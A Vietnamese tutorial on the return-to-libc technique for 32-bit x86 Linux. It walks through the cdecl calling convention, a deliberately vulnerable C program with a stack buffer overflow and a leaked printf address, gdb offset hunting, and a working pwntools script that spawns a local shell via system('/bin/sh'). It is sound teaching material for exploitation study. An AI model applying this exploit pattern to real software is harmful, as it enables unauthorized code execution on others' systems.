# Return to libc

kỹ thuật này được áp dụng khi ta có thể leak được address và control eip thay đổi ret addr thành 1 function trong shared library của binary

## Table of Contents

-	[x86](#x86)
## x86
### Calling convention
#### Cdecl(C declaration)
-	thường được dùng trong c/c++ của hệ OS x86
-	mặc định thì linux kernel dùng Cdecl làm calling convention (quy ước cách gọi hàm)
-	có những tích chất sau:
	-	lưu các argument được pass vào trong stack, theo hướng từ phải qua
	-	giá trị trả về lưu ở thanh eax
	-	sau khi gọi hàm xong sẽ tự động dọn stack (stack cleanup)
-	các tính năng của calling convention:

|tính năng| giải thích|
|-----------|--------------|
|truyền biến| sử dụng stack|
|thứ tự truyền biến| từ phải sang trái|
|giá trị trả về từ hàm| eax|
|stack cleanup| calling convention sẽ dọn dẹp stack sau khi đã gọi xong hàm|

lấy ví dụ đoạn code sau:
```c
int a,b,c,d;
int ret;
 
ret = function(a,b,c,d);
```

nếu bạn đổi đoạn code trên thành assembly theo cdecl format, nó sẽ được giải thích như sau:

-	4 biến a,b,c,d sẽ được lưu vào trong stack bằng instruction `PUSH`, theo thứ tự từ phải sang trái
-	giá trị trả về sau khi gọi `function()` được lưu vào trong eax, và giá trị đó sẽ được lưu vào biết ret

```asm
push    d
push    c
push    b
push    a
call    function
mov     ret,eax
```
>related link:

[link1](http://www.int80h.org/bsdasm/#default-calling-convention)
[link2](https://en.wikipedia.org/wiki/Calling_convention)

#### example
source:
```c
#include <stdlib.h>
#include <stdio.h>
 
void vuln(int a,int b,int c,int d){
        printf("%d, %d, %d, %d",a,b,c,d);
}
 
void main(){
        vuln(1,2,3,4);
}
```
use gdb, objdump,... to extract the disassembly code:
```asm
0x0804845d <+0>:	lea    ecx,[esp+0x4]
0x08048461 <+4>:	and    esp,0xfffffff0
0x08048464 <+7>:	push   DWORD PTR [ecx-0x4]
0x08048467 <+10>:	push   ebp
0x08048468 <+11>:	mov    ebp,esp
0x0804846a <+13>:	push   ecx
0x0804846b <+14>:	sub    esp,0x4
0x0804846e <+17>:	call   0x8048491 <__x86.get_pc_thunk.ax>
0x08048473 <+22>:	add    eax,0x1b8d
0x08048478 <+27>:	push   0x4
0x0804847a <+29>:	push   0x3
0x0804847c <+31>:	push   0x2
0x0804847e <+33>:	push   0x1
0x08048480 <+35>:	call   0x8048426 <vuln>
0x08048485 <+40>:	add    esp,0x10
0x08048488 <+43>:	nop
0x08048489 <+44>:	mov    ecx,DWORD PTR [ebp-0x4]
0x0804848c <+47>:	leave  
0x0804848d <+48>:	lea    esp,[ecx-0x4]
0x08048490 <+51>:	ret    

```
thử set break point ở hàm vuln

![](https://i.imgur.com/TcMSAAT.png)
và sau khi pass các arg vào hàm vuln thì nó sẽ thực hiện các bước như sau:

-	 calling frame của hàm main được push vào stack
	-	calling frame cũ được lưu vào thanh ebp
-	calling frame mới của hàm vuln được khởi tạo bằng thanh ebp (mov ebp, esp)
	-	bằng cách sử dụng thanh ebp, ta có thể dùng các arg được truyền vào từ hàm main()
```asm
0x08048426 <+0>:	push   ebp
0x08048427 <+1>:	mov    ebp,esp
0x08048429 <+3>:	push   ebx
0x0804842a <+4>:	sub    esp,0x4
0x0804842d <+7>:	call   0x8048491 <__x86.get_pc_thunk.ax>
0x08048432 <+12>:	add    eax,0x1bce
0x08048437 <+17>:	sub    esp,0xc
0x0804843a <+20>:	push   DWORD PTR [ebp+0x14]
0x0804843d <+23>:	push   DWORD PTR [ebp+0x10]
0x08048440 <+26>:	push   DWORD PTR [ebp+0xc]
0x08048443 <+29>:	push   DWORD PTR [ebp+0x8]
0x08048446 <+32>:	lea    edx,[eax-0x1ae0]
0x0804844c <+38>:	push   edx
0x0804844d <+39>:	mov    ebx,eax
0x0804844f <+41>:	call   0x80482e0 <printf@plt>
0x08048454 <+46>:	add    esp,0x20
0x08048457 <+49>:	nop
0x08048458 <+50>:	mov    ebx,DWORD PTR [ebp-0x4]
0x0804845b <+53>:	leave  
0x0804845c <+54>:	ret 
```
-	chúng ta có thể kiểm tra các giá trị param được pass vào ở trong `DWORD PTR [ebp+*]`
	-	các instruction này chính là các arg ta đã truyền vào từ trước đó từ `DWORD PTR [ebp+0x8]` đến `DWORD PTR [ebp+0x14]`
	-	còn ở khu vực `DWORD PTR [ebp+0x4]`, giá trị return address của hàm đang gọi (tức vuln)được lưu. 
	-	và calling frame của hàm trước đó (hàm main) được lưu ở `DWORD PTR [ebp]`.

theo lý thuyết trên là như thế, nhưng hiện nay với các modern OS, thì việc này đã thay đổi khá nhiều so với quá khứ, chẳng hạn như chúng ta thấy có 1 hàm `__x86.get_pc_thunk.ax` của mỗi hàm được gọi, theo như Stackoverflow giải thích:

>This call is used in position-independent code on x86. It loads the position of the code into the %ebx register, which allows global objects (which have a fixed offset from the code) to be accessed as an offset from that register.

>Position-independent code is code that can be loaded and executed, unmodified, at different addresses. It is important for code that will be linked into shared libraries, because these can be mapped at a different address in different processes.

>Note that an equivalent call is not required on x86-64, because that architecture has IP-relative addressing modes (that is, it can directly address memory locations as an offset from the location of the current instruction).

cho nên hiện thực khá là khác biệt với những gì đã được nêu ở trên


|address|value|explaination|
|-------|-----|------------|
|0xffffcfec<+4>|0x8048485| ret address của main|
|0xffffcfe8<+0>|0xffffd008|ebp của vuln(prev calling frame)|
|0xffffcfd0<-24>|0x4|arg4|
|0xffffcfcc<-28>|0x3|arg3|
|0xffffcfc8<-32>|0x2|arg2|
|0xffffcfc4<-36>|0x1|arg1|

![](https://i.imgur.com/a8Il0lS.png)

như vậy, với cấu trúc trên, nếu ta áp dụng ret2libc thì sẽ như thế nào?

|stack address|value|explain|
|-------------|-----|-------|
|0xffffcff4<+12>|/bin/sh| arg của system|
|0xffffcff0<+8>| calling frame| prev calling frame|
|0xffffcfec<+4>| system libc| hàm system()|
|0xffffcfe8<+0>| padding|padding giá trị nào đó|

#### Proof of Concept

source:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50] = "";
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```

tùy vào OS như thế nào mà compile ra được code assembly khác nhau
```asm
0x080484b6 <+0>:	push   ebp
0x080484b7 <+1>:	mov    ebp,esp
0x080484b9 <+3>:	push   edi
0x080484ba <+4>:	push   esi
0x080484bb <+5>:	push   ebx
0x080484bc <+6>:	sub    esp,0x4c
0x080484bf <+9>:	call   0x80483f0 <__x86.get_pc_thunk.bx>
0x080484c4 <+14>:	add    ebx,0x1b3c
0x080484ca <+20>:	mov    DWORD PTR [ebp-0x4e],0x0
0x080484d1 <+27>:	lea    eax,[ebp-0x4a]
0x080484d4 <+30>:	mov    ecx,0x2e
0x080484d9 <+35>:	mov    esi,0x0
0x080484de <+40>:	mov    DWORD PTR [eax],esi
0x080484e0 <+42>:	mov    DWORD PTR [eax+ecx*1-0x4],esi
0x080484e4 <+46>:	lea    edx,[eax+0x4]
0x080484e7 <+49>:	and    edx,0xfffffffc
0x080484ea <+52>:	sub    eax,edx
0x080484ec <+54>:	add    ecx,eax
0x080484ee <+56>:	and    ecx,0xfffffffc
0x080484f1 <+59>:	shr    ecx,0x2
0x080484f4 <+62>:	mov    edi,edx
0x080484f6 <+64>:	mov    eax,esi
0x080484f8 <+66>:	rep stos DWORD PTR es:[edi],eax
0x080484fa <+68>:	sub    esp,0x8
0x080484fd <+71>:	lea    eax,[ebx-0x1a10]
0x08048503 <+77>:	push   eax
0x08048504 <+78>:	push   0xffffffff
0x08048506 <+80>:	call   0x8048380 <dlsym@plt>
0x0804850b <+85>:	add    esp,0x10
0x0804850e <+88>:	mov    DWORD PTR [ebp-0x1c],eax
0x08048511 <+91>:	sub    esp,0x8
0x08048514 <+94>:	push   DWORD PTR [ebp-0x1c]
0x08048517 <+97>:	lea    eax,[ebx-0x1a09]
0x0804851d <+103>:	push   eax
0x0804851e <+104>:	call   0x8048360 <printf@plt>
0x08048523 <+109>:	add    esp,0x10
0x08048526 <+112>:	sub    esp,0x4
0x08048529 <+115>:	push   0x64
0x0804852b <+117>:	lea    eax,[ebp-0x4e]
0x0804852e <+120>:	push   eax
0x0804852f <+121>:	push   0x0
0x08048531 <+123>:	call   0x8048350 <read@plt>
0x08048536 <+128>:	add    esp,0x10
0x08048539 <+131>:	nop
0x0804853a <+132>:	lea    esp,[ebp-0xc]
0x0804853d <+135>:	pop    ebx
0x0804853e <+136>:	pop    esi
0x0804853f <+137>:	pop    edi
0x08048540 <+138>:	pop    ebp
0x08048541 <+139>:	ret    
```
bắt đầu send thử padding 
```asm
   0x804853a <vuln+132>    lea    esp, [ebp - 0xc]
   0x804853d <vuln+135>    pop    ebx
   0x804853e <vuln+136>    pop    esi
   0x804853f <vuln+137>    pop    edi
   0x8048540 <vuln+138>    pop    ebp
 ► 0x8048541 <vuln+139>    ret    <0x61616161>
```
như vậy theo box của mình thì được pad với offset là 0x52. kế tiếp chính là tìm địa chỉ của system và cuối cùng là địa chỉ chứa chuỗi '/bin/sh'

-	ta có địa chỉ printf được leak là: `0xf7e2a3a0`, như vậy để tìm được địa chỉ system thì trước tiên ta phải tìm được địa chỉ libc
	-	để tìm được địa chỉ libc ta có thể dùng rất nhiều cách, nhưng trong bài viết này sẽ dùng gdb để tìm offset
		-	dùng lên vmmap để lấy địa chỉ libc: `0xf7dd9000`
	-	như vậy offset để tính ra libc là: 0xf7e2a3a0(printf) - 0xf7dd9000(libc) = 0x513a0
	-	địa chỉ của system cũng tương tự: 0xf7e16250(system) -  0xf7dd9000(libc) = 0x3d250

**NOTE**: tại sao lại phải tìm offset? bởi vì trên linux, còn có ASLR(link) nên ta không thể dùng libc lấy từ gdb để dùng được. Vì vậy với ret2libc ta có thể bypass được cả DEP(NX), ASLR nếu ta có thể leak được địa chỉ
```asm
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/xfeebe/research/basic-exploit/ret2libc/ret2libc
 0x8049000  0x804a000 r--p     1000 0      /home/xfeebe/research/basic-exploit/ret2libc/ret2libc
 0x804a000  0x804b000 rw-p     1000 1000   /home/xfeebe/research/basic-exploit/ret2libc/ret2libc
 0x804b000  0x806d000 rw-p    22000 0      [heap]
0xf7dd9000 0xf7fae000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7fae000 0xf7faf000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7faf000 0xf7fb1000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb1000 0xf7fb2000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb2000 0xf7fb5000 rw-p     3000 0      
0xf7fb5000 0xf7fb8000 r-xp     3000 0      /lib/i386-linux-gnu/libdl-2.27.so
0xf7fb8000 0xf7fb9000 r--p     1000 2000   /lib/i386-linux-gnu/libdl-2.27.so
0xf7fb9000 0xf7fba000 rw-p     1000 3000   /lib/i386-linux-gnu/libdl-2.27.so
0xf7fd0000 0xf7fd2000 rw-p     2000 0      
0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]
0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]
0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
pwndbg> x system
0xf7e16250 <__libc_system>:	0x8b0cec83
pwndbg> x printf
0xf7e2a3a0 <__printf>:	0x0e6234e8
```
còn lại là địa chỉ chứa chuỗi /bin/sh, ta có thể dùng lệnh sau để tìm địa chỉ đó
0xf7f573cf(/bin/sh) - 0xf7dd9000(libc) = 0x17e3cf
```asm
pwndbg> find 0xf7dd9000, 0xf7fb2000, "/bin/sh"
0xf7f573cf
1 pattern found.
```

như vậy là ta đã có hội đủ các yếu tố, bây giờ thử build PoC
```py
from pwn import *

p=process('./ret2libc')

p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

libc = stackAddr - 0x513a0
system = libc + 0x3d250
bin_sh = libc + 0x17e3cf


payload = 'A'*0x52
payload +=p32(system)
payload += 'AAAA'
payload += p32(bin_sh)
# payload += p32(0)

p.sendline(payload)

p.interactive()
```

```bash
$ python script.py 
[+] Starting local process './ret2libc': pid 8389
[*] Switching to interactive mode
$ id
uid=1000(xfeebe) gid=1000(xfeebe) groups=1000(xfeebe),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),998(docker)
$  
```